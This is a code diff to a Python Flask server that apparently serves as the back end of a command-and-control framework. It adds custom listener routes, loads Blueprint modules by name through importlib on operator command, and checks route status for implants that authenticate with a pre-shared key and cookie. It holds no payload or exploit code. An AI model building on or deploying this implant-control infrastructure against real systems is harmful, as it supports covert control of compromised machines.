@@ -1,5 +1,6 @@
 import base64
-from dnslib import QTYPE, DNSRecord, RR, PTR, RCODE
+import importlib
+from dnslib import QTYPE, DNSRecord, RR, PTR
 from urllib.parse import urlparse
 import hashlib
 import hmac
@@ -17,7 +18,7 @@ from queue import Queue, Empty
 from threading import Thread
 import secrets
 
-from flask import Flask, request, jsonify, abort, Response
+from flask import Flask, request, jsonify, abort, Response, Blueprint
 
 import ipv6_encoder
 import pw_hash
@@ -63,21 +64,57 @@ with open('s_conf.json', 'r') as file:
 with open('../Implant/shared/config.json', 'r') as file:
     imp_conf = json.load(file)
 
-# Get the listener names from the config file and add them to a list
 listeners_list = config["listeners"]
+custom_listeners = config["custom_listeners"]
+
 # Then form a dict with the listener name and their enabled state
 route_status = {}
-for listener in config["listeners"]:
-    name = listener['name']
-    path = listener['path']
-    method = listener['method']
-    # Ensure we only store the enabled/disabled status for each method on the same path
-    if path not in route_status:
-        route_status[path] = {}
-    if name not in route_status[path]:
-        route_status[path][name] = {}
-    route_status[path][name][method] = listener['enabled'].lower() == "true"  # Store as True or False
-print(route_status)
+
+def get_routes():
+    """
+    Load the route config from the json conf file
+    :return: nothing
+    """
+    logger.info("loading route config for enabled/disabled routes")
+    for listener in config["listeners"]:
+        name = listener['name']
+        path = listener['path']
+        method = listener['method']
+        # Ensure we only store the enabled/disabled status for each method on the same path
+        if path not in route_status:
+            route_status[path] = {}
+        if name not in route_status[path]:
+            route_status[path][name] = {}
+        route_status[path][name][method] = listener['enabled'].lower() == "true"  # Store as True or False
+
+    for listener in config["custom_listeners"]:
+        name = listener['name']
+        path = listener['path']
+        method = listener['method']
+        # Ensure we only store the enabled/disabled status for each method on the same path
+        if path not in route_status:
+            route_status[path] = {}
+        if name not in route_status[path]:
+            route_status[path][name] = {}
+        route_status[path][name][method] = listener['enabled'].lower() == "true"  # Store as True or False
+        logger.info(route_status)
+
+
+def register_blueprints(new_bp):
+    """
+    Dynamically registers any new Blueprints passed to the function by name.
+    :param new_bp: The Blueprint name set in the decorator
+    :param url_route: The route to serve on
+    :return: nothing
+    """
+    module = importlib.import_module(f'blueprints.{new_bp}')
+    blueprint = getattr(module, f'{new_bp}_blueprint')
+    # Register the Blueprint and mark it as registered
+    # Pass the blueprint decorator name and path from the config file
+    app.register_blueprint(blueprint)
+    # Refresh the route list for enabled/disabled states
+    get_routes()
+    logger.info(f"new blueprint registered: {new_bp}")
 
 
 def find_get_val(req_meth):
@@ -398,11 +435,14 @@ def handle_client(client_socket):
 
             case "RFR":
                 logger.info("refreshing routes")
-                request_type, uname, token, *message = client_request.split(" ", 3)
+                request_type, uname, token, bp_name, *message = client_request.split(" ", 4)
                 if token in operator_session_tokens:
-                    register_routes()
-                    logger.info("refreshed routes")
-                    client_socket.send(f"Routes refreshed".encode())
+                    # Refresh the route status
+                    get_routes()
+                    # Register the user Blueprints
+                    register_blueprints(bp_name)
+                    logger.info("refreshed routes/blueprints")
+                    client_socket.send(f"Routes refreshed and Blueprints loaded".encode())
                 else:
                     client_socket.send(f"Bad token\n".encode())
                     logger.error("bad token, couldn't refresh routes")
@@ -432,6 +472,7 @@ def register_routes():
         :param get_imp_id: This represents the implant ID
         :return: Either the waiting command or error
         """
+        # The PSK used for the HMAC
         imp_psk1 = imp_conf["psk1"]
         logger.info("GET incoming for authenticated listener URI")
         if request.cookies.get("da"):
@@ -569,11 +610,21 @@ register_routes()
 
 
 @app.before_request
+def ignore_favicon():
+    if request.path == '/favicon.ico':
+        abort(204)  # No Content
+
+
+@app.before_request
 def restrict_routes():
     """Middleware to block disabled routes."""
-    logger.info(f"checking if route is enabled: {request.path} {request.method}")
+    base_uri = request.path.split("/")
+    root_path = "/" + base_uri[1]
+    logger.info(f"checking if route is enabled: {root_path} {request.method}")
+
     # Check if the request path matches a disabled route
-    if request.url_rule.rule in route_status or request.url_rule is None:
+    if request.url_rule is None or root_path in route_status:
+        # Check if they return true/false
         if find_get_val(request.method):
             logger.warning(f"disabled route accessed: {request.path} {request.method}")
             abort(404)  # Return a 404 if the route is disabled
@@ -590,7 +641,6 @@ def doh_handler():
         dns_query = base64.urlsafe_b64decode(dns_query_base64)
 
 
-
 def start_flask():
     app.run()
 
@@ -601,6 +651,8 @@ def start_server():
     Run an infinite loop until cancelled to handle socket requests
     :return: Nothing
     """
+    # Get the initial route list
+    get_routes()
     flask_thread = Thread(target=start_flask)
     flask_thread.start()
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -616,6 +668,7 @@ def start_server():
         server_side=True,
     )
     logger.info("TLS socket wrapped and starting on port 9999\n")
+    # register_blueprints("example")
 
     while True:
         client_socket, addr = secure_socket.accept()
